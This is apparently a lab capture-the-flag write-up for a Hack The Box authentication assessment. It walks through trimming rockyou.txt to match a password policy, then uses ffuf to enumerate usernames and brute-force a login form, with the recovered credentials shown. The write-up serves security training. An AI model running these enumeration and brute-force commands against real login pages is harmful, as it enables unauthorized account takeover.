# HTB Broken Authentication Skills Assessment

```
The tech company SecureMint Innovations has tasked you to perform a security assessment of their web application after deploying an entirely new authentication concept,
including an updated password policy designed to strengthen overall account security. The client wants assurance that no hidden weaknesses could still put user accounts at risk.
Your task is to focus specifically on identifying vulnerabilities within the authentication process. Try to utilize the various techniques you learned in this module to identify
and exploit vulnerabilities found in the web application.
```

Obtain the Flag.

<img width="1910" height="615" alt="image" src="https://github.com/user-attachments/assets/34481259-625d-45b1-a55f-3dac29abdf0f" />
<img width="1829" height="533" alt="image" src="https://github.com/user-attachments/assets/69a9b7d1-cad8-429d-a625-3a494085b257" />
<img width="1500" height="644" alt="image" src="https://github.com/user-attachments/assets/adf71e49-5e5f-445c-b11b-acbbc702f150" />

```
sudo grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{12}' > rockyouTrimmed.txt
```

<img width="1856" height="541" alt="image" src="https://github.com/user-attachments/assets/6966abcc-0c6a-479c-8b43-22e96e289d76" />

<img width="403" height="58" alt="image" src="https://github.com/user-attachments/assets/ea8718ef-e25d-4228-9e9d-78794ab5814c" />

Login:

<img width="1139" height="438" alt="image" src="https://github.com/user-attachments/assets/e31c79c9-113f-49ff-96fb-c4ea3ce606a1" />

```
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.55.124:53148/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=123" -fr "Unknown username or password."
gladys                  [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 30ms]
```

```
ffuf -w rockyouTrimmed.txt -u http://94.237.55.124:53148/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials." -t 60
dWinaldasD13            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 97ms]
```

<img width="1492" height="571" alt="image" src="https://github.com/user-attachments/assets/ffb0252f-f1ad-4df6-9b23-1c2eaff572fd" />
<img width="1299" height="404" alt="image" src="https://github.com/user-attachments/assets/03668dae-831b-42b7-9fdd-ad53e1ba4570" />
<img width="1461" height="527" alt="image" src="https://github.com/user-attachments/assets/eec6d70b-ede4-45ec-8672-f0e28adda069" />
<img width="1443" height="538" alt="image" src="https://github.com/user-attachments/assets/a541c799-8b52-40ee-adbe-636bfe9d6477" />
















